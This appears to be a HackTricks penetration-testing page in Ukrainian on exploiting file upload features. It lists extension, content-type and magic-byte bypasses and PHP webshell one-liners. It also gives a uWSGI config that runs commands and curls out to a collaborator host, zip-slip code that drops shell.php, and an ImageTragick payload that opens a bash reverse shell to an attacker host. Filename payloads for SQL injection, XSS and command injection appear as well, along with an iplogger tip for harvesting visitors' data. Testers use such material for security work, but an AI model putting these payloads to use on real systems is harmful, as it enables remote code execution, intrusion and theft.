# Завантаження файлів

{{#include ../../banners/hacktricks-training.md}}

## Загальна методологія завантаження файлів

Інші корисні розширення:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Обхід перевірок розширень файлів

1. Якщо застосовно, **перевірте попередні розширення.** Також протестуйте їх, використовуючи **великі літери**: _pHp, .pHP5, .PhAr ..._
2. _Перевірте **додавання дійсного розширення перед** виконуваним розширенням (використовуйте також попередні розширення):_
- _file.png.php_
- _file.png.Php5_
3. Спробуйте додати **спеціальні символи в кінці.** Можна використати Burp, щоб **bruteforce** всі **ascii** та **Unicode** символи. (_Зверніть увагу, що також можна спробувати використати **попередньо** згадані **розширення**_)  
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Спробуйте обійти захист, **обдуривши парсер розширень** на сервері за допомогою технік, таких як **подвійне** розширення або **додавання сміттєвих** даних (**null** байтів) між розширеннями. _Ви також можете використати **попередні розширення** для підготовки кращого payload'а._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Додайте **ще один шар розширень** до попередньої перевірки:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Спробуйте поставити **виконуване розширення перед дійсним розширенням** і сподівайтеся на помилкову конфігурацію сервера. (корисно для експлуатації неправильних налаштувань Apache, де все з розширенням** _**.php**_**, але** не обов'язково що закінчується на .php** буде виконувати код):
- _ex: file.php.png_
7. Використання **NTFS alternate data stream (ADS)** у **Windows**. У цьому випадку після забороненого розширення і перед дозволеним буде вставлено двокрапку ":". В результаті на сервері буде створений **порожній файл із забороненим розширенням** (наприклад "file.asax:.jpg”). Цей файл може бути відредагований пізніше іншими техніками, наприклад використовуючи його коротке ім'я файлу. Також можна використати шаблон "**::$data**” для створення не-порожніх файлів. Тому додавання крапки після цього шаблону також може бути корисним для обходу подальших обмежень (наприклад "file.asp::$data.”)
8. Спробуйте перевантажити ліміт імені файлу. Дійсне розширення обрізається. А шкідливий PHP залишається. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Обхід Content-Type, Magic Number, Compression & Resizing

- Обійдіть перевірки **Content-Type**, встановивши **значення** заголовка **Content-Type** на: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Обійдіть перевірку **magic number**, додавши на початок файлу **байти справжнього зображення** (заплутати команду _file_). Або вставте шелл всередину **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` або ви також можете **вставити payload безпосередньо** в зображення:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Якщо до вашого зображення застосовується **сжаття** (наприклад через стандартні PHP-бібліотеки, такі як [PHP-GD](https://www.php.net/manual/fr/book.image.php)), попередні техніки можуть не спрацювати. Проте можна використати **PLTE chunk** [**техніку описану тут**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html), щоб вставити текст, який **втримається після стиснення**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Веб-сторінка також може **змінювати розмір** зображення, використовуючи, наприклад, функції PHP-GD `imagecopyresized` або `imagecopyresampled`. Проте можна використати **IDAT chunk** [**техніку описану тут**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html), щоб вставити текст, який **втримається після стиснення**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Інша техніка для створення payload'а, що **витримує зміну розміру зображення**, використовуючи PHP-GD функцію `thumbnailImage`. Проте можна використати **tEXt chunk** [**техніку описану тут**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html), щоб вставити текст, який **втримається після стиснення**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Інші трюки для перевірки

- Знайдіть вразливість, щоб **перейменувати** вже завантажений файл (щоб змінити розширення).
- Знайдіть вразливість **Local File Inclusion**, щоб виконати backdoor.
- **Можливе розкриття інформації**:
1. Завантажте файл **кілька разів** (і одночасно) з **однаковим іменем**
2. Завантажте файл з **іменем** файлу або папки, яка **вже існує**
3. Завантаження файлу з іменем **"." , "..”, або "…”**. Наприклад, в Apache на **Windows**, якщо додаток зберігає завантажені файли в каталозі "/www/uploads/”, ім'я файлу "." створить файл під назвою "uploads” в каталозі "/www/”.
4. Завантажте файл, який може бути важко видалити, наприклад **"…:.jpg”** в **NTFS**. (Windows)
5. Завантажте файл у **Windows** з **невалідними символами** в імені, такими як `|<>*?”`. (Windows)
6. Завантажте файл у **Windows** з використанням зарезервованих (заборонених) імен, таких як CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, та LPT9.
- Також спробуйте **завантажити виконуваний** файл (.exe) або **.html** (менш підозріло), який **виконає код** при випадковому відкритті жертвою.

### Спеціальні трюки з розширеннями

Якщо ви намагаєтеся завантажити файли на **PHP server**, [погляньте на трюк з **.htaccess** для виконання коду](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Якщо ви намагаєтеся завантажити файли на **ASP server**, [погляньте на трюк з **.config** для виконання коду](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Файли `.phar` схожі на `.jar` для java, але для php, і можуть бути **використані як php файл** (виконуючи його через php, або включаючи його всередину скрипта...)

Розширення `.inc` іноді використовують для php файлів, які лише імпортують інші файли, тож інколи може бути дозволено **виконання такого розширення**.

## **Jetty RCE**

Якщо ви можете завантажити XML файл на Jetty server, ви можете отримати [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Отже, як згадано на наступному зображенні, завантажте XML файл в `$JETTY_BASE/webapps/` і очікуйте shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Для детального вивчення цієї вразливості перевірте оригінальне дослідження: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) вразливості можуть бути експлуатовані на uWSGI серверах, якщо є можливість змінити `.ini` конфігураційний файл. Конфігураційні файли uWSGI використовують специфічний синтаксис для включення "magic" змінних, заповнювачів і операторів. Зокрема, оператор '@', який використовується як `@(filename)`, призначений для включення вмісту файлу. Серед різних схем, підтримуваних у uWSGI, схема "exec" є особливо потужною, дозволяючи читати дані зі стандартного виводу процесу. Цю функцію можна використати для зловмисних цілей, таких як Remote Command Execution або Arbitrary File Write/Read, коли обробляється `.ini` конфігураційний файл.

Розгляньте наступний приклад шкідливого `uwsgi.ini` файлу, що демонструє різні схеми:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Виконання payload відбувається під час парсингу файлу конфігурації. Щоб конфігурацію було активовано й розпарсено, процес uWSGI має бути або перезапущений (потенційно після крашу або через Denial of Service attack), або файл має бути встановлений на auto-reload. Функція auto-reload, якщо ввімкнена, перезавантажує файл через вказані інтервали при виявленні змін.

Важливо розуміти вільний характер парсингу файлу конфігурації uWSGI. Зокрема, обговорюваний payload можна вставити в бінарний файл (наприклад, зображення чи PDF), що ще більше розширює можливості експлуатації.

## **wget Трюк завантаження файлів/SSRF**

У деяких випадках ви можете виявити, що сервер використовує **`wget`** для **завантаження файлів** і ви можете вказати **URL**. У таких випадках код може перевіряти, що розширення скачуваних файлів входить у whitelist, щоб гарантувати, що будуть завантажені лише дозволені файли. Однак **цю перевірку можна обійти.**\

Максимальна **довжина** **імені файлу** в **linux** — **255**, однак **wget** обрізає імена файлів до **236** символів. Ви можете **завантажити файл з іменем "A"\*232+".php"+".gif"**, це ім'я файлу **обійде** **перевірку** (у цьому прикладі **".gif"** є **допустимим** розширенням), але `wget` **перейменує** файл на **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Зауважте, що **ще одна опція**, про яку ви, можливо, думаєте, щоб обійти цю перевірку — змусити **HTTP server перенаправляти на інший файл**, тож початковий URL пройде перевірку, але wget завантажить перенаправлений файл з новим іменем. Це **не спрацює**, **якщо не** використовувати wget з **параметром** `--trust-server-names`, оскільки **wget завантажить перенаправлену сторінку з іменем файлу, вказаним в оригінальному URL**.

## Інструменти

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) — потужний інструмент, створений, щоб допомогти Pentesters і Bug Hunters тестувати механізми завантаження файлів. Він використовує різні bug bounty техніки, щоб спростити процес виявлення й експлуатації вразливостей, забезпечуючи ретельну оцінку веб-застосунків.

### Corrupting upload indices with snprintf quirks (historical)

Деякі застарілі upload handlers, які використовують `snprintf()` або подібні функції для побудови multi-file масивів з однофайлового завантаження, можна обдурити, щоб сфальсифікувати структуру `_FILES`. Через непослідовності та усікання в поведінці `snprintf()`, ретельно сформоване одноразове завантаження може виглядати як кілька індексованих файлів на сервері, плутаючи логіку, що очікує певну форму (наприклад, трактуючи як multi-file upload і виконуючи небезпечні гілки). Хоча сьогодні це рідкість, патерн «index corruption» іноді з'являється в CTF і старих кодових базах.

## Від завантаження файлів до інших вразливостей

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Перевірте, чи існує будь-яке **size limit** при завантаженні файлів

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Магічні байти заголовка

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar файл, що автоматично розпаковується при завантаженні

Якщо ви можете завантажити ZIP, який буде розпаковано всередині сервера, ви можете зробити 2 речі:

### Symlink

Завантажте архів, що містить символічні посилання на інші файли; при доступі до розпакованих файлів ви отримаєте доступ до пов'язаних файлів:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Розпакування в різні папки

Неочікуване створення файлів у директоріях під час розпаковування є серйозною проблемою. Незважаючи на початкові припущення, що така конфігурація може захищати від виконання команд на рівні ОС через завантаження шкідливих файлів, підтримка ієрархічного стиснення та можливості directory traversal формату ZIP можуть бути експлуатовані. Це дозволяє атакуючим обходити обмеження та виходити за межі захищених директорій завантаження, маніпулюючи функцією розпаковування цільового додатка.

Автоматизований експлойт для створення таких файлів доступний на [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Утиліту можна використовувати, як показано:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Крім того, доступний варіант — **symlink trick with evilarc**. Якщо метою є доступ до файлу, наприклад `/flag.txt`, потрібно створити symlink на цей файл у вашій системі. Це гарантує, що evilarc не зіткнеться з помилками під час своєї роботи.

Нижче наведено приклад Python-коду, який використовується для створення зловмисного zip-файлу:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Зловживання компресією для file spraying**

Для детальнішої інформації **перегляньте оригінальний пост на**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP-код пишеться для виконання команд, переданих через змінну `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Створюються кілька файлів та пакується zip-архів, що містить ці файли.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Імена файлів всередині zip змінюються за допомогою vi або Hex Editor, замінюючи "xxA" на "../" для обходу директорій.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Завантажте цей вміст з розширенням зображення, щоб експлуатувати вразливість **(ImageMagick , 7.0.1-1)** (з [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Вбудовування PHP Shell у PNG

Вбудовування PHP Shell у IDAT chunk PNG-файлу може ефективно обійти певні операції обробки зображень. Функції `imagecopyresized` та `imagecopyresampled` з PHP-GD особливо релевантні в цьому контексті, оскільки вони зазвичай використовуються для зміни розміру та ресемплінгу зображень відповідно. Здатність вбудованого PHP Shell залишатися неушкодженим під час цих операцій є значною перевагою для певних сценаріїв використання.

Детальний розгляд цієї техніки, включно з методологією та можливими застосуваннями, представлений у наступній статті: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Цей ресурс дає всебічне розуміння процесу та його наслідків.

Детальніше: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Поліглот-файли слугують унікальним інструментом у кібербезпеці, виступаючи хамелеонами, які можуть одночасно коректно існувати у кількох форматах файлів. Цікавим прикладом є [GIFAR](https://en.wikipedia.org/wiki/Gifar), гібрид, який одночасно функціонує як GIF і RAR-архів. Такі файли не обмежуються цією комбінацією; можливі також поєднання типу GIF і JS або PPT і JS.

Основна користь поліглот-файлів полягає в їх здатності обійти заходи безпеки, що фільтрують файли за типом. Звична практика в багатьох додатках — дозволяти до завантаження лише певні типи файлів, наприклад JPEG, GIF або DOC, щоб зменшити ризик від потенційно шкідливих форматів (наприклад, JS, PHP або Phar). Однак поліглот, відповідаючи структурним вимогам кількох форматів файлів, може непомітно обминати ці обмеження.

Незважаючи на гнучкість, поліглоти мають обмеження. Наприклад, хоча поліглот може одночасно бути PHAR (PHp ARchive) та JPEG, успішність його завантаження може залежати від політики платформи щодо розширень файлів. Якщо система суворо перевіряє допустимі розширення, сама по собі структурна подвійність поліглота може бути недостатньою для гарантії завантаження.

Детальніше: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Як уникнути визначення типу файлу, завантажуючи валідний JSON-файл, навіть якщо це не дозволено, прикидаючись PDF-файлом (техніки з **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Поки `%PDF` magic bytes знаходяться в перших 1024 байтах, воно вважається валідним (див. приклад у пості)
- **`pdflib` library**: Додайте фейковий PDF-вміст всередину поля JSON, щоб бібліотека вважала його PDF (див. приклад у пості)
- **`file` binary**: Воно може читати до 1048576 байт з файлу. Просто створіть JSON більший за це, щоб програма не могла розпарсити вміст як JSON, а потім всередині JSON вставте початкову частину реального PDF — і воно вважатиме файл PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
